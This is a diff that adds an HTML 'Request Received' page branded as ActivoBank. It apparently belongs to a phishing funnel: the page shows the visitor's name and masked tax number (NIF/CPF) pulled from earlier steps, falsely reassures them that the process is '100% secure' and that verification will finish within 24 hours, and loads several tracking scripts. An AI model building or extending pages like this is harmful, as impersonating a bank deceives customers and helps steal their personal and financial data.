@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<script>
+window.apiUrl = window.apiUrl || function (p) {
+  if (!p) return '';
+  if (/^https?:\/\//i.test(p)) return p;
+  var path = p.charAt(0) === '/' ? p : '/' + p;
+  var host = location.hostname;
+  var port = String(location.port || '');
+  if ((host === 'localhost' || host === '127.0.0.1') && port && port !== '8080') {
+    return 'http://127.0.0.1:8080' + path;
+  }
+  return path;
+};
+</script>
+<script src="../extensions/api-base.js"></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Request Received — ActivoBank</title>
+
+<script defer src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="3269fe28-2341-4107-9bf9-f1ad9d68455f"></script>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:#f3f4f6;color:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0;cursor:pointer;flex-shrink:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#0a0a0a;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#0a0a0a}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:capitalize}
+  .user-info .nif{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .avatar svg{width:18px;height:18px}
+
+  .card{margin:16px;background:#fff;border-radius:22px;padding:36px 24px;box-shadow:0 1px 2px rgba(0,0,0,.04);text-align:center;flex:1}
+  .status-icon{width:64px;height:64px;border-radius:50%;background:#f0fdf4;color:#16a34a;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+  .status-icon svg{width:32px;height:32px}
+  h1{font-size:22px;font-weight:800;letter-spacing:-.5px;margin-bottom:10px}
+  .lead{font-size:14px;color:#52525b;line-height:1.6;margin-bottom:24px}
+
+  .info-box{background:#f9fafb;border:1.5px solid #f0f0f3;border-radius:16px;padding:18px 16px;text-align:left;margin-bottom:20px}
+  .info-row{display:flex;justify-content:space-between;gap:12px;padding:8px 0;font-size:13px;border-bottom:1px solid #f0f0f3}
+  .info-row:last-child{border-bottom:0}
+  .info-row .label{color:#71717a}
+  .info-row .val{font-weight:700;color:#0a0a0a}
+
+  .secure-badge{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:#71717a}
+  .secure-badge svg{width:14px;height:14px;color:#419c63}
+
+  .site-footer{text-align:center;padding:24px 16px 30px;color:#71717a;font-size:11px;background:#fff;margin-top:8px}
+  .site-footer .logo-wrap{display:flex;justify-content:center;margin-bottom:6px}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- TOPBAR -->
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="103" height="28" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
+    </div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">customer</div>
+        <div class="nif" id="userNif">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="card">
+    <div class="status-icon">
+      <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h1>Request Received</h1>
+    <p class="lead">Your account activation request has been submitted successfully. We're finalizing the last verification steps and will notify you by email and SMS as soon as everything is confirmed.</p>
+
+    <div class="info-box">
+      <div class="info-row"><span class="label">Status</span><span class="val">Processing</span></div>
+      <div class="info-row"><span class="label">Estimated time</span><span class="val">Up to 24 hours</span></div>
+    </div>
+
+    <div class="secure-badge">
+      <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      100% secure and encrypted process
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="site-footer">
+    <div class="logo-wrap">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
+    </div>
+    ActivoBank<br/>Operating across the European Union
+  </div>
+
+</div>
+
+<script>
+try{(function(){
+  var nome=(localStorage.getItem('nome')||'customer').trim();
+  var parts=nome.split(/\s+/);
+  var elName=document.getElementById('userName');
+  var elNif=document.getElementById('userNif');
+  if(elName) elName.textContent=((parts[0]||'customer')+' '+(parts.slice(-1)[0]||'')).trim().toLowerCase();
+  var nif=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/\D/g,'');
+  if(nif.length>=5 && elNif) elNif.textContent=nif.slice(0,3)+' *** '+nif.slice(-3);
+})();}catch(initErr){ console.error('[NAO-CONFIRMADO] Error in IIFE init:', initErr); }
+</script>
+
+<script>window.__FUNIL_PAGE__="nao-confirmado";</script>
+<script src="../extensions/messages-catalog.js"></script>
+<script src="../extensions/site-messages.js"></script>
+<script src="../extensions/tracking-config-loader.js"></script>
+<script src="../extensions/tracker.js"></script>
+</body>
+</html>
